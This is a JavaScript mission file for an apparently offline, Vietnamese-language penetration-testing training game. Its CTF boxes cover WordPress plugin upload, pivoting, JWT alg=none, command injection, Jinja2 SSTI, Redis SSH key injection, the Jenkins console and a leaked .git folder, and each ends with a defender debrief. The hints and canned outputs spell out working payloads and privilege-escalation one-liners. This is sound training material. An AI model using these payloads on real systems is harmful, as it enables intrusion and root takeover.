// Mission MỚI (bổ sung) cho Chương 8 — bám OSCP M22 / eJPT / PNPT. Engine offline.
// id tiếp từ 4. Lệnh file-based (cat /etc/crontab, find -perm, cat flag) chạy THẬT -> KHÔNG output.
// Lệnh tool (nmap/wpscan/proxychains/ssh -D/gobuster) -> output canned TIẾNG ANH.
import fsC8M4 from '../filesystems/chapter8-mission4.js';
import fsC8M5 from '../filesystems/chapter8-mission5.js';
import fsC8M6 from '../filesystems/chapter8-mission6.js';
import fsC8M7 from '../filesystems/chapter8-mission7.js';
import fsC8M8 from '../filesystems/chapter8-mission8.js';
import fsC8M9 from '../filesystems/chapter8-mission9.js';
import fsC8M10 from '../filesystems/chapter8-mission10.js';
import fsC8M11 from '../filesystems/chapter8-mission11.js';
import fsC8M12 from '../filesystems/chapter8-mission12.js';

export default [
  {
    id: 4,
    chapterId: 8,
    title: 'CTF — Box Wordpress',
    story:
      'Box mới trong lab OSCP: 10.10.10.40, chạy WordPress. Chuỗi kinh điển: scan ra cổng 80, dùng wpscan soi plugin dính lỗi, khai thác để có www-data shell. Rồi để ý cron của root chạy một script mà mày ghi đè được — đó là vé lên root.',
    steps: [
      {
        id: 'scan',
        description: 'Scan service, xác nhận web 80 chạy WordPress',
        match: /^nmap\b/,
        output: [
          'Starting Nmap 7.94 ( https://nmap.org )',
          'Nmap scan report for 10.10.10.40',
          'PORT   STATE SERVICE VERSION',
          '22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu',
          '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
          '|_http-generator: WordPress 5.7.2',
        ].join('\n'),
      },
      {
        id: 'wpscan',
        description: 'Dùng wpscan enumerate plugin dính lỗi',
        match: /^wpscan\b/,
        output: [
          '[+] URL: http://10.10.10.40/',
          '[+] WordPress version 5.7.2 identified',
          '[i] Plugin(s) Identified:',
          '[+] wp-file-manager',
          ' |  Version: 6.0 (vulnerable)',
          ' |  [!] Title: WP File Manager <= 6.9 - Unauthenticated Arbitrary File Upload (CVE-2020-25213)',
          ' |  [!] Refs: https://wpscan.com/vulnerability/...',
        ].join('\n'),
      },
      {
        id: 'foothold',
        description: 'Khai thác plugin để có www-data shell',
        match: /exploit|upload|connector\.minimal|cmd=|curl\b.*40|shell/i,
        output: 'Exploit CVE-2020-25213 -> upload PHP via file-manager connector -> http://10.10.10.40/shell.php?cmd=id -> uid=33(www-data). Foothold!',
      },
      {
        id: 'find_cron',
        description: 'Đọc /etc/crontab tìm script root chạy mà mình ghi được',
        match: /^cat\s+\/etc\/crontab|ls\s+-l.*wp-backup\.sh/,
      },
      {
        id: 'privesc',
        description: 'Inject payload vào script, đợi cron của root chạy',
        match: /chmod\s+\+s|cp\s+\/bin\/bash|>>\s*\/opt\/backup\/wp-backup\.sh|echo.*wp-backup\.sh/,
        output: 'Appended `cp /bin/bash /tmp/rb && chmod +s /tmp/rb` to wp-backup.sh. Root cron fires (every 2 min) -> /tmp/rb is SUID root. Run `/tmp/rb -p` -> uid=0(root).',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'CMS phổ biến thì có công cụ enum riêng cho nó — nghĩ xem dùng gì để soi WordPress.',
      'Chạy `nmap -sV 10.10.10.40` thấy 80 = WordPress. Rồi `wpscan --url http://10.10.10.40 --enumerate vp` để lòi plugin dính lỗi.',
      'Khai thác plugin: `curl http://10.10.10.40/shell.php?cmd=id` để có www-data shell. Sau đó `cat /etc/crontab` -> root chạy /opt/backup/wp-backup.sh (world-writable). Append `cp /bin/bash /tmp/rb && chmod +s /tmp/rb`, đợi cron, `/tmp/rb -p`, rồi `cat /root/flag.txt`.',
    ],
    terms: [
      { term: 'foothold', def: 'Chỗ đứng đầu tiên trong hệ thống — shell quyền thấp (vd www-data) sau khi khai thác dịch vụ ngoài.' },
      { term: 'CMS exploit', def: 'Khai thác lỗ hổng trong hệ quản trị nội dung (WordPress, Joomla...), thường qua plugin/theme dính bug.' },
      { term: 'wpscan', def: 'Công cụ chuyên quét WordPress: dò version, liệt kê plugin/theme/user và đối chiếu CSDL lỗ hổng.' },
      { term: 'cron privesc', def: 'Leo quyền bằng cách lợi dụng job định kỳ chạy bằng root trên script/file mà user thường ghi được.' },
    ],
    debrief: [
      'Attacker coi CMS là bề mặt béo bở: bản thân lõi vá nhanh, nhưng plugin/theme bên thứ ba thường cũ và đầy CVE chưa vá.',
      'wpscan tự động hoá khâu fingerprint version + map plugin sang lỗ hổng đã biết — biến recon thành vài giây.',
      'Privesc ở đây không cần exploit kernel: chỉ là một file script chạy bằng root nhưng ai cũng ghi được — lỗi cấu hình, không phải lỗi phần mềm.',
      'DEFENDER: gỡ/khoá plugin không dùng, bật auto-update; chạy web bằng user tối thiểu quyền; siết quyền file (script cron KHÔNG world-writable), kiểm tra `find / -perm -o+w` định kỳ; WAF chặn upload tuỳ tiện.',
    ],
    initialFilesystem: fsC8M4,
  },
  {
    id: 5,
    chapterId: 8,
    title: 'CTF — Box Pivot',
    story:
      'Mày đã có web shell trên 10.10.10.45 — nhưng đó mới là máy biên. Báu vật nằm trong subnet 172.16.0.0/24 mà từ máy mày không ping tới được. Bài học pivoting: biến máy đã chiếm thành cầu nối, dựng SOCKS proxy, rồi xuyên qua nó tấn công box nội bộ.',
    steps: [
      {
        id: 'foothold',
        description: 'Xác nhận web shell trên máy biên',
        match: /^(nmap|curl|wget)\b|cmd=|shell|whoami/i,
        output: 'Web shell on 10.10.10.45 -> uid=33(www-data). This is a perimeter host; the juicy stuff is elsewhere.',
      },
      {
        id: 'discover_subnet',
        description: 'Phát hiện subnet nội bộ (route / arp / interface)',
        match: /^(ip\s+route|ip\s+a|ifconfig|arp\b|route\b)|cat\s+.*notes\.txt/i,
        output: [
          'eth0  10.10.10.45/24',
          'eth1  172.16.0.45/24   <-- dual-homed! second NIC into an internal subnet',
          '172.16.0.0/24 dev eth1  proto kernel  scope link',
          '(host 172.16.0.10 alive on the internal side)',
        ].join('\n'),
      },
      {
        id: 'tunnel',
        description: 'Dựng SOCKS proxy qua máy biên (ssh -D)',
        match: /ssh\s+.*-D\s*1080|dynamic|socks/i,
        output: 'SOCKS5 proxy up on 127.0.0.1:1080 via `ssh -D 1080` through 10.10.10.45. proxychains is configured (socks5 127.0.0.1 1080).',
      },
      {
        id: 'internal_recon',
        description: 'Dùng proxychains quét box nội bộ qua tunnel',
        match: /^proxychains\b.*nmap|proxychains\b.*172\.16/i,
        output: [
          '[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.10:445  ...  OK',
          'Nmap scan report for 172.16.0.10',
          '445/tcp open  microsoft-ds   Samba smbd 4.6.2 (vulnerable)',
          '8080/tcp open http           internal admin panel',
        ].join('\n'),
      },
      {
        id: 'exploit',
        description: 'Khai thác box nội bộ qua proxychains để có shell',
        match: /^proxychains\b.*(exploit|msf|smb|psexec|curl)|exploit|psexec/i,
        output: 'proxychains -> exploit Samba/admin panel on 172.16.0.10 -> shell on the internal box. Now read the flag.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Máy mày chiếm được có thể có nhiều hơn một card mạng. Xem nó nối tới đâu trước đã.',
      'Xác nhận web shell trước: `curl http://10.10.10.45/shell.php?cmd=whoami` -> www-data. Rồi `ip route` / `cat /var/www/html/notes.txt` -> thấy eth1 ở 172.16.0.0/24. Dựng SOCKS: `ssh -D 1080 user@10.10.10.45`.',
      'Chạy `proxychains nmap -sT 172.16.0.10` rồi `proxychains curl http://172.16.0.10:8080/exploit` để khai thác Samba/admin panel nội bộ. Sau khi có shell: `cat /root/flag.txt`.',
    ],
    terms: [
      { term: 'pivoting', def: 'Dùng một máy đã chiếm làm bàn đạp để tiếp cận mạng/host khác mà máy tấn công không tới trực tiếp được.' },
      { term: 'dual-homed', def: 'Máy có từ 2 card mạng trở lên, bắc cầu giữa các subnet (vd DMZ và mạng nội bộ).' },
      { term: 'proxychains', def: 'Công cụ ép một chương trình (nmap, curl...) định tuyến traffic qua proxy SOCKS/HTTP của tunnel.' },
      { term: 'internal recon', def: 'Trinh sát các host/dịch vụ bên trong mạng nội bộ sau khi đã có chỗ đứng, để tìm mục tiêu tiếp theo.' },
    ],
    debrief: [
      'Một foothold ở DMZ thường vô giá trị nếu dừng lại — giá trị thật là dùng nó làm cầu để chạm mạng nội bộ vốn "tin tưởng" máy biên.',
      'Máy dual-homed phá vỡ ranh giới phân đoạn: firewall ngoài vô dụng khi attacker đã đứng ở phía trong qua tunnel.',
      'SOCKS proxy (ssh -D) + proxychains cho phép chạy gần như mọi tool qua đường hầm mà không cần upload tool lên đích.',
      'DEFENDER: phân đoạn mạng chặt (máy biên KHÔNG được nối thẳng vào subnet nhạy cảm); egress filtering + chặn SSH outbound bất thường; giám sát host nội bộ nhận kết nối từ DMZ; micro-segmentation / zero-trust thay vì tin theo vị trí mạng.',
    ],
    initialFilesystem: fsC8M5,
  },
  {
    id: 6,
    chapterId: 8,
    title: 'CTF — Box Hard Chain',
    story:
      'Bài hard, ít hint. Target 10.10.10.50 black-box. Full port scan lòi ra một cổng lạ chạy API ở /dev. Bên trong là JWT verify cẩu thả chấp nhận alg=none — giả token admin, rồi một endpoint dính command injection cho mày shell user. Từ đó tự enum SUID và leo root. Hai cờ: user.txt và root.txt.',
    steps: [
      {
        id: 'fullscan',
        description: 'Full port scan (-p-) tìm cổng/dịch vụ lạ',
        match: /^nmap\b.*-p-|^nmap\b/,
        output: [
          'Nmap scan report for 10.10.10.50',
          'PORT      STATE SERVICE',
          '22/tcp    open  ssh',
          '5000/tcp  open  http     (Node.js Express API)',
          '50051/tcp open  unknown',
          '(port 5000 serves a JSON API — enumerate paths)',
        ].join('\n'),
      },
      {
        id: 'enum_api',
        description: 'Gobuster tìm endpoint /dev API ẩn',
        match: /^(gobuster|ffuf|dirb)\b/,
        output: [
          '/api                  (Status: 200)',
          '/dev                  (Status: 401)   <-- protected, needs JWT',
          '/health               (Status: 200)',
        ].join('\n'),
      },
      {
        id: 'jwt_bypass',
        description: 'Bypass auth bằng JWT alg=none (giả token admin)',
        match: /jwt|alg.*none|none.*alg|token|bearer/i,
        output: 'Forged JWT with header {"alg":"none"} and payload {"user":"admin"} (no signature). /dev now returns 200 -> authenticated as admin.',
      },
      {
        id: 'cmd_injection',
        description: 'Khai thác command injection ở /dev để có user shell',
        match: /command\s*injection|;\s*id|`id`|\$\(.*\)|%3b|inject|curl\b.*\/dev/i,
        output: 'POST /dev {"host":"127.0.0.1; id"} -> command injection -> output uid=1001(svc). Spawn a reverse shell -> shell as svc.',
      },
      {
        id: 'read_user_flag',
        description: 'Đọc cờ user (user.txt)',
        match: /^cat\s+.*user\.txt/,
      },
      {
        id: 'enum_suid',
        description: 'Liệt kê binary SUID để tìm đường lên root',
        match: /find\b.*-perm\b.*4000/,
      },
      {
        id: 'privesc',
        description: 'Lợi dụng SUID binary (GTFOBins) để thành root',
        match: /python3?\.?9?\s+-c.*os\.|os\.setuid|gtfobins|-c\s+.*import\s+os/i,
        output: '/usr/bin/python3.9 has SUID -> `python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'` (GTFOBins) -> uid=0(root).',
      },
      {
        id: 'read_root_flag',
        description: 'Đọc cờ root (root.txt)',
        match: /^cat\s+\/root\/root\.txt/,
      },
    ],
    hints: [
      'Bài hard, hint tối thiểu. Cổng dịch vụ thường (80/443) chưa chắc là tất cả — quét HẾT port. Và để ý cách API ký/duyệt token.',
      '`nmap -p- 10.10.10.50` ra cổng lạ chạy API; `gobuster dir -u http://10.10.10.50:5000 -w wordlist.txt` tìm /dev (401). Lỗ hổng JWT: thử header `{"alg":"none"}` bỏ chữ ký để giả admin.',
      'Sau khi vào /dev: tham số bị nối thẳng vào lệnh hệ thống -> chèn `; id`. Có shell svc thì `cat .../user.txt`, rồi `find / -perm -4000 2>/dev/null` -> SUID python -> `os.setuid(0)` -> `cat /root/root.txt`.',
    ],
    terms: [
      { term: 'black-box', def: 'Kiểu pentest chỉ biết tối thiểu (vd 1 IP), không có source/tài liệu — phải tự khám phá toàn bộ.' },
      { term: 'JWT none-alg', def: 'Lỗ hổng khi server chấp nhận JWT có header alg="none" (không chữ ký) -> kẻ tấn công tự chế token tuỳ ý.' },
      { term: 'command injection', def: 'Lỗ hổng cho phép chèn lệnh hệ điều hành vào input bị nối thẳng vào shell (vd qua `;`, `&&`, `$()`).' },
      { term: 'multi-stage privesc', def: 'Leo quyền qua nhiều chặng: foothold quyền thấp -> đọc cờ user -> tìm SUID/misconfig -> root -> cờ root.' },
    ],
    debrief: [
      'Black-box buộc attacker enum kỹ: bỏ sót full-port scan là bỏ sót cả dịch vụ chính (API ở cổng cao, không phải 80).',
      'JWT alg=none là lỗi triển khai thư viện kinh điển: tin vào trường "alg" do client gửi, nên kẻ tấn công tự khai báo "không cần chữ ký".',
      'Command injection xảy ra khi input người dùng bị nối vào lệnh shell — một dấu `;` đủ để chuyển từ "tham số" thành "lệnh".',
      'DEFENDER: ép thuật toán JWT phía server (allowlist, không đọc alg từ token), kiểm tra chữ ký bắt buộc; thay shell-exec bằng API/thư viện an toàn + validate input; tối thiểu hoá SUID binary, audit `find / -perm -4000`; phân tách user dịch vụ.',
    ],
    initialFilesystem: fsC8M6,
  },
  {
    id: 7,
    chapterId: 8,
    title: 'CTF — Box Template',
    story:
      'Target 10.10.10.60. Một web app nhỏ có ô nhập tên rồi in lại lời chào — y hệt kiểu code hay bị dính SSTI. Nếu template engine render thẳng input của mày như code, mày không chỉ XSS được mà chạy lệnh hệ thống luôn. Sau đó kiểm tra quyền sudo để tìm đường lên root.',
    steps: [
      {
        id: 'scan',
        description: 'Scan service, xác nhận web app chạy Python/Flask',
        match: /^nmap\b/,
        output: [
          'Starting Nmap 7.94 ( https://nmap.org )',
          'Nmap scan report for 10.10.10.60',
          'PORT   STATE SERVICE VERSION',
          '22/tcp open  ssh     OpenSSH 8.4p1 Debian',
          '80/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.9.5)',
        ].join('\n'),
      },
      {
        id: 'probe_ssti',
        description: 'Gửi payload toán học vào ô tên để test SSTI (vd {{7*7}})',
        match: /\{\{.*7\s*\*\s*7.*\}\}|\{\{.*\*.*\}\}/,
        output: 'GET /greet?name={{7*7}} -> response: "Xin chào 49"  <-- template tự eval biểu thức! Đây là Server-Side Template Injection (Jinja2).',
      },
      {
        id: 'rce',
        description: 'Khai thác SSTI để chạy lệnh hệ thống (qua __class__/os.popen của Jinja2)',
        match: /__class__|os\.popen|popen|__mro__|__globals__|subprocess/i,
        output: "GET /greet?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} -> uid=33(www-data). RCE confirmed!",
      },
      {
        id: 'sudo_check',
        description: 'Kiểm tra quyền sudo của www-data',
        match: /^sudo\s+-l/,
        output: ['Matching Defaults entries for www-data on this host:', '', 'User www-data may run the following commands on this host:', '    (root) NOPASSWD: /usr/bin/find'].join('\n'),
      },
      {
        id: 'privesc',
        description: 'Lợi dụng sudo find (GTFOBins) để có shell root',
        match: /sudo\s+find\b.*-exec|find\b.*-exec.*\/bin\/sh|find\b.*-exec.*\/bin\/bash/,
        output: 'sudo find . -exec /bin/sh \\; -quit -> uid=0(root). GTFOBins find privesc thành công.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Ô nhập nào in lại y nguyên những gì mày gõ vào output đều đáng nghi — thử một biểu thức toán học xem nó có tự tính không. Trước đó nhớ `nmap -sV 10.10.10.60` để xác nhận đây là Flask.',
      'Gửi `{{7*7}}` vào tham số name; nếu trả về 49 thay vì "7*7" thì engine đang EVAL template — đó là SSTI. Từ đó leo lên gọi os.popen qua chuỗi `{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}`.',
      'Có shell www-data thì `sudo -l` ngay — nếu thấy NOPASSWD: /usr/bin/find, tra GTFOBins: `sudo find . -exec /bin/sh \\; -quit` cho root, rồi `cat /root/flag.txt` -> FLAG{ssti_jinja2_rce_then_sudo_find_gtfobins}.',
    ],
    terms: [
      { term: 'SSTI', def: 'Server-Side Template Injection: input người dùng bị nối thẳng vào template rồi engine eval như code thay vì chỉ hiển thị.' },
      { term: 'Jinja2', def: 'Template engine phổ biến của Python (Flask); cú pháp {{ }} cho phép eval biểu thức nếu input không được sandbox.' },
      { term: 'sudo -l', def: 'Liệt kê lệnh mà user hiện tại được phép sudo — bước đầu tiên khi tìm đường privesc.' },
      { term: 'GTFOBins', def: 'Database các binary hợp pháp có thể bị lợi dụng để escape/privesc khi có SUID hoặc quyền sudo.' },
    ],
    debrief: [
      'SSTI khác XSS ở chỗ payload chạy phía SERVER, không phải trình duyệt — nên hậu quả luôn là RCE thay vì chỉ ăn cắp cookie.',
      'Test SSTI bắt đầu bằng polyglot toán học đơn giản ({{7*7}}, ${7*7}, #{7*7}...) tuỳ engine; nếu engine eval thì đã có chỗ đứng để leo dần lên gọi hàm hệ thống.',
      'sudo NOPASSWD trên một binary tưởng vô hại như find là lỗi cấu hình admin hay mắc — find có cờ -exec chạy được bất kỳ lệnh nào, biến nó thành cửa hậu root tức thì.',
      'DEFENDER: không bao giờ render input người dùng bằng render_template_string trực tiếp — dùng template tĩnh + biến truyền vào (auto-escape); sandbox Jinja2 nếu buộc phải render động; audit sudoers định kỳ, không bao giờ NOPASSWD cho binary có khả năng -exec/spawn shell.',
    ],
    initialFilesystem: fsC8M7,
  },
  {
    id: 8,
    chapterId: 8,
    title: 'CTF — Box Redis',
    story:
      'Target 10.10.10.65. Quét ra Redis ở cổng 6379 không cần xác thực — ai gõ lệnh cũng được. Redis cho phép ghi file tuỳ ý, và mày sẽ lợi dụng đúng tính năng đó để tự đẩy SSH key của mình vào máy. Sau khi vào được, một cron job world-writable sẽ đưa mày lên root.',
    steps: [
      {
        id: 'scan',
        description: 'Scan service, phát hiện Redis mở không xác thực',
        match: /^nmap\b/,
        output: ['Starting Nmap 7.94 ( https://nmap.org )', 'Nmap scan report for 10.10.10.65', 'PORT     STATE SERVICE', '22/tcp   open  ssh', '6379/tcp open  redis', '|_redis-info: Redis 5.0.7 (no password set!)'].join('\n'),
      },
      {
        id: 'redis_connect',
        description: 'Kết nối Redis bằng redis-cli, xác nhận không cần password',
        match: /^redis-cli\s+(-h\s+\S+\s*)?(10\.10\.10\.65)?\s*$|^redis-cli\b.*ping/i,
        output: ['10.10.10.65:6379> PING', 'PONG', '(không hỏi AUTH gì cả — full quyền đọc/ghi key)'].join('\n'),
      },
      {
        id: 'write_ssh_key',
        description: 'Ghi public key của mày vào authorized_keys qua Redis CONFIG SET + SAVE',
        match: /config\s+set\s+dir|config\s+set\s+dbfilename|\bSAVE\b|authorized_keys/i,
        output: [
          '10.10.10.65:6379> CONFIG SET dir /var/lib/redis/.ssh',
          'OK',
          '10.10.10.65:6379> CONFIG SET dbfilename authorized_keys',
          'OK',
          '10.10.10.65:6379> SET pubkey "\\n\\nssh-rsa AAAAB3... hacker@kali\\n\\n"',
          'OK',
          '10.10.10.65:6379> SAVE',
          'OK   <-- public key của mày giờ nằm trong /var/lib/redis/.ssh/authorized_keys',
        ].join('\n'),
      },
      {
        id: 'ssh_in',
        description: 'SSH vào bằng key vừa đẩy lên, với user redis',
        match: /^ssh\b.*redis@10\.10\.10\.65|^ssh\b.*-i\s+\S+.*redis@/i,
        output: 'redis@10.10.10.65: Welcome to Ubuntu. $ whoami -> redis  (foothold qua chính service Redis!)',
      },
      {
        id: 'find_cron',
        description: 'Đọc /etc/cron.d tìm job root chạy script mình ghi được',
        match: /^cat\s+\/etc\/cron\.d\/.*|^ls\s+-l.*\/opt\/sync/,
      },
      {
        id: 'privesc',
        description: 'Inject payload vào flush.sh, đợi cron root chạy',
        match: /chmod\s+\+s|cp\s+\/bin\/bash|>>\s*\S*flush\.sh|echo.*flush\.sh/,
        output: 'Appended `cp /bin/bash /tmp/rb && chmod +s /tmp/rb` to /opt/sync/flush.sh. Cron root chạy mỗi 3 phút -> /tmp/rb SUID root. Chạy `/tmp/rb -p` -> uid=0(root).',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Một database không hỏi mật khẩu gì cả là dấu hiệu nguy hiểm — và Redis có lệnh CHO PHÉP GHI FILE. Trước đó nhớ `nmap -sV 10.10.10.65` để xác nhận Redis mở không auth.',
      'Connect bằng `redis-cli -h 10.10.10.65`. Dùng `CONFIG SET dir` + `CONFIG SET dbfilename` để đổi nơi Redis lưu dump, rồi `SET` nội dung public key của mày và `SAVE` để nó ghi xuống thành authorized_keys.',
      'Trỏ dir vào `/var/lib/redis/.ssh`, dbfilename thành `authorized_keys`, SET một key chứa public key SSH của mày, SAVE, rồi `ssh redis@10.10.10.65 -i ~/.ssh/id_rsa`. Vào trong: `cat /etc/cron.d/redis-sync` lộ /opt/sync/flush.sh world-writable -> `echo \'cp /bin/bash /tmp/rb && chmod +s /tmp/rb\' >> /opt/sync/flush.sh`, đợi cron, `/tmp/rb -p`, `cat /root/flag.txt` -> FLAG{redis_unauth_ssh_key_then_cron_root}.',
    ],
    terms: [
      { term: 'Redis unauthenticated', def: 'Redis mặc định KHÔNG bật password — nếu expose ra ngoài, ai cũng đọc/ghi được toàn bộ dữ liệu và file.' },
      { term: 'CONFIG SET dir/dbfilename', def: 'Lệnh Redis cho phép đổi nơi và tên file khi SAVE — lợi dụng được để ghi file tuỳ ý lên hệ thống.' },
      { term: 'SSH key injection', def: 'Kỹ thuật ghi public key của attacker vào authorized_keys của victim qua một lỗ hổng ghi file, để SSH vào không cần mật khẩu.' },
      { term: 'cron privesc', def: 'Leo quyền bằng cách lợi dụng job định kỳ chạy bằng root trên script mà user thường ghi được.' },
    ],
    debrief: [
      'Redis được thiết kế cho mạng nội bộ tin cậy — không có auth/ACL mặc định trước Redis 6; expose thẳng ra Internet biến nó thành một "ổ ghi file từ xa" miễn phí.',
      'CONFIG SET dir + dbfilename + SAVE là bộ ba kinh điển để ép Redis dump dữ liệu ra đúng vị trí và tên file mong muốn — không cần exploit phức tạp, chỉ là dùng đúng tính năng sai mục đích.',
      'Đẩy SSH key qua Redis là một dạng "service abuse": không khai thác lỗi code, mà lợi dụng tính năng hợp lệ của service để đạt write-primitive trên filesystem.',
      'DEFENDER: luôn bật `requirepass` hoặc Redis ACL (6+); bind Redis vào 127.0.0.1, không bao giờ expose 6379 ra Internet; chạy Redis bằng user riêng không có quyền ghi vào ~/.ssh của ai; firewall chặn port database theo nguyên tắc default-deny.',
    ],
    initialFilesystem: fsC8M8,
  },
  {
    id: 9,
    chapterId: 8,
    title: 'CTF — Box Jenkins',
    story:
      'Target 10.10.10.70. CI/CD server chạy Jenkins, và trang /script (Groovy console) không hỏi đăng nhập gì cả — đó chính là RCE built-in hợp pháp. Sau khi có shell, mày sẽ đào credential store của Jenkins và phát hiện admin tái sử dụng đúng mật khẩu đó cho root Linux.',
    steps: [
      {
        id: 'scan',
        description: 'Scan service, xác nhận Jenkins chạy ở cổng 8080',
        match: /^nmap\b/,
        output: ['Starting Nmap 7.94 ( https://nmap.org )', 'Nmap scan report for 10.10.10.70', 'PORT     STATE SERVICE', '22/tcp   open  ssh', '8080/tcp open  http     Jetty (Jenkins 2.303.1)'].join('\n'),
      },
      {
        id: 'find_script_console',
        description: 'Truy cập /script (Groovy console) không cần đăng nhập',
        match: /\/script\b|script\s+console/i,
        output: 'GET http://10.10.10.70:8080/script -> 200 OK. Trang "Script Console" load thẳng, KHÔNG redirect tới login. Misconfiguration nghiêm trọng.',
      },
      {
        id: 'groovy_rce',
        description: 'Chạy lệnh hệ thống qua Groovy script (Runtime.exec)',
        match: /runtime\.getruntime|\.exec\(|groovy|\.execute\(\)/i,
        output: 'println "id".execute().text -> uid=1000(jenkins). RCE qua Groovy console thành công, shell là jenkins user.',
      },
      {
        id: 'find_creds',
        description: 'Đọc credentials.xml để tìm mật khẩu lưu trong Jenkins',
        match: /^cat\s+.*credentials\.xml/,
      },
      {
        id: 'check_passwd',
        description: 'Xem /etc/passwd để biết có tài khoản root nào dùng chung mật khẩu',
        match: /^cat\s+\/etc\/passwd/,
      },
      {
        id: 'privesc',
        description: 'Dùng mật khẩu vừa tìm thấy để su lên root',
        match: /^su\s+(-\s+)?root|^su\s+root/,
        output: 'su root, password: J3nkins_R00t_2024! -> uid=0(root). Mật khẩu admin Jenkins TÁI SỬ DỤNG cho root Linux — credential reuse cổ điển.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Jenkins có một console cho phép viết và chạy script ngay trên server — nếu nó không yêu cầu đăng nhập thì đó là RCE miễn phí. Trước đó `nmap -sV 10.10.10.70` để xác nhận cổng 8080.',
      'Vào `http://10.10.10.70:8080/script`. Nếu load thẳng không hỏi login, gõ Groovy: `println "id".execute().text` để chạy lệnh hệ thống.',
      'Có shell jenkins thì `cat /var/lib/jenkins/secrets/credentials.xml` lộ mật khẩu admin; `cat /etc/passwd` xem có tài khoản root nào — thử đúng mật khẩu đó cho `su root` (admin tái sử dụng password) -> root, rồi `cat /root/flag.txt` -> FLAG{jenkins_script_console_credential_reuse_root}.',
    ],
    terms: [
      { term: 'Jenkins Script Console', def: 'Tính năng hợp pháp của Jenkins cho phép admin chạy Groovy script trực tiếp trên server — nếu không khoá auth thì biến thành RCE công khai.' },
      { term: 'Groovy RCE', def: 'Chạy lệnh hệ điều hành qua Groovy bằng "command".execute() hoặc Runtime.getRuntime().exec().' },
      { term: 'credential reuse', def: 'Lỗi dùng lại CÙNG MỘT mật khẩu cho nhiều hệ thống khác nhau — lộ một nơi là lộ tất cả nơi khác.' },
      { term: 'CI/CD attack surface', def: 'Hệ thống build/deploy (Jenkins, GitLab CI) thường có quyền cao và kết nối tới nhiều hệ thống khác, nên là mục tiêu giá trị cao khi bị chiếm.' },
    ],
    debrief: [
      'Jenkins Script Console là tính năng CHỦ Ý cho phép chạy code tuỳ ý trên server — nó không phải bug, mà là một backdoor hợp pháp bị bỏ quên không khoá auth.',
      'Một server CI/CD bị chiếm thường nguy hiểm hơn một web app thường: nó lưu credentials cho hàng chục hệ thống khác (cloud, registry, server đích) để phục vụ tự động hoá.',
      'Credential reuse giữa Jenkins admin và root Linux là lỗi quản trị con người, không phải lỗi kỹ thuật — nhưng hậu quả y hệt: một mật khẩu lộ là toang cả chuỗi.',
      'DEFENDER: bật security realm + authorization matrix cho Jenkins, không bao giờ để /script truy cập ẩn danh; tách biệt mật khẩu giữa các hệ thống, dùng password manager + mật khẩu ngẫu nhiên riêng cho từng service; audit log truy cập Script Console; chạy Jenkins agent với quyền tối thiểu, không cùng máy với secrets nhạy.',
    ],
    initialFilesystem: fsC8M9,
  },
  {
    id: 10,
    chapterId: 8,
    title: 'CTF — Box GitLeak',
    story:
      'Target 10.10.10.75. Dev quên xoá thư mục .git khi deploy — toàn bộ lịch sử commit nằm công khai trên webroot. Mày sẽ dump cả repo, lật lại các commit cũ để tìm secret tưởng đã "xoá", rồi dùng nó để vào máy và leo quyền qua Linux capability thay vì SUID.',
    steps: [
      {
        id: 'find_git',
        description: 'Phát hiện /.git lộ trên webroot',
        match: /curl\b.*\.git\/config|wget\b.*\.git|\/\.git\b/i,
        output: 'curl http://10.10.10.75/.git/config -> 200 OK. [remote "origin"] url = git@internal:acme/deploy-app.git  <-- .git folder bị expose nguyên trên web!',
      },
      {
        id: 'dump_repo',
        description: 'Dump toàn bộ repo bằng git-dumper hoặc wget đệ quy',
        match: /git-dumper|wget\b.*-r\b.*\.git|gitdump/i,
        output: 'git-dumper http://10.10.10.75/.git/ ./dump -> [+] Downloaded 47 objects. Full repo reconstructed locally.',
      },
      {
        id: 'check_history',
        description: 'Xem lịch sử commit để tìm secret đã từng bị commit rồi "xoá"',
        match: /^git\s+log\s+-p|^cat\s+.*HEAD\b|^git\s+log\b/,
      },
      {
        id: 'leak_key',
        description: 'Xác nhận API key vẫn còn nguyên trong commit cũ',
        match: /sk_live|deploy_api_key|api[_-]?key/i,
        output: 'commit a1b2c3d (cha của HEAD): + define("DEPLOY_API_KEY", "sk_live_9fK2mQpL7xZ");  <-- vẫn đọc được dù commit sau đã xoá dòng này.',
      },
      {
        id: 'ssh_in',
        description: 'Dùng API key đó như mật khẩu SSH cho user deploy',
        match: /^ssh\b.*deploy@10\.10\.10\.75/i,
        output: 'ssh deploy@10.10.10.75, password: sk_live_9fK2mQpL7xZ -> Welcome! $ whoami -> deploy   (API key tưởng vô hại lại chính là mật khẩu hệ thống!)',
      },
      {
        id: 'check_capabilities',
        description: 'Tìm binary có Linux capability bất thường (getcap -r /)',
        match: /^getcap\s+-r\s+\//,
      },
      {
        id: 'privesc',
        description: 'Lợi dụng cap_setuid trên perl để có shell root (GTFOBins)',
        match: /perl\s+-e.*setuid|posix::setuid|perl.*-e.*\$>\s*=\s*0/i,
        output: "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";' -> uid=0(root). cap_setuid+ep trên /usr/bin/perl chính là vector privesc.",
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Khi deploy code lên web server, có một thư mục ẨN dễ bị quên xoá mà chứa NGUYÊN lịch sử mọi commit từng có.',
